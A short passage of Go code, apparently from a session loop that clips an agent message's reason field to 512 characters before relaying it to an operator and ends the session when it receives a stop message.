				msg.Reason = msg.Reason[:512]
				clipped, marshalErr := json.Marshal(msg)
				if marshalErr != nil {
					continue
				}
				sess.sendRawToOperator(clipped)
				continue
			}
			sess.sendRawToOperator(raw)
		case "stop":
			sess.end("agent_stop")
			return
		}
	}
}
